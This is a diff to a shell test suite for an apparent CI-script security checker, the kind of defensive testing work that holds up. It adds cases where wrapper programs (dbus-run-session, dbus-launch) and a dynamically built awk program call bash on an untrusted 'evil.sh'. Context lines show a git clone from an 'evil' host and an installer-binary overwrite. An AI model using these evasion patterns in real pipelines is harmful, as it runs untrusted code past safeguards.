@@ -35,6 +35,8 @@ t wrapper-prlimit 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefai
 t wrapper-timeout 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}timeout 10 bash \"\${GITHUB_WORKSPACE}/evil.sh\""
 t wrapper-setarch 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}setarch x86_64 bash \"\${GITHUB_WORKSPACE}/evil.sh\""
 t wrapper-linux32 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}linux32 bash \"\${GITHUB_WORKSPACE}/evil.sh\""
+t wrapper-dbus 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}dbus-run-session -- bash \"\${GITHUB_WORKSPACE}/evil.sh\""
+t wrapper-dbus-launch 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}dbus-launch --exit-with-session bash \"\${GITHUB_WORKSPACE}/evil.sh\""
 
 # --- git allowlist (subcommands fetch/diff/show/merge-base; -c quotePath) ---
 t git-clone-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git clone https://evil/x"
@@ -75,6 +77,8 @@ t awk-string-pipe-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk '{
 t awk-include 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk '@include \"\${GITHUB_WORKSPACE}/evil.awk\"' </dev/null"
 t awk-load 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk '@load \"\${GITHUB_WORKSPACE}/evil.so\"' </dev/null"
 t awk-directive-string-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk '{print \"@include\"}' /dev/null"
+# --- dynamic program words (Codex P1: awk "$prog") ---
+t awk-stale-prog 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf -v prog %s 'BEGIN { system(\"bash \" ENVIRON[\"\${GITHUB_WORKSPACE}\"] \"/evil.sh\") }'; awk \"\$prog\" </dev/null"
 
 # --- installer TOCTOU (Codex P1: post-verify tmp_bin write) ---
 t toctou-cat 1 "muse-installer-toctou" happy.sarif "$I${FS}got_sha=${FS}a${FS}cat \"\${GITHUB_WORKSPACE}/evil\" > \"\${tmp_bin}\""
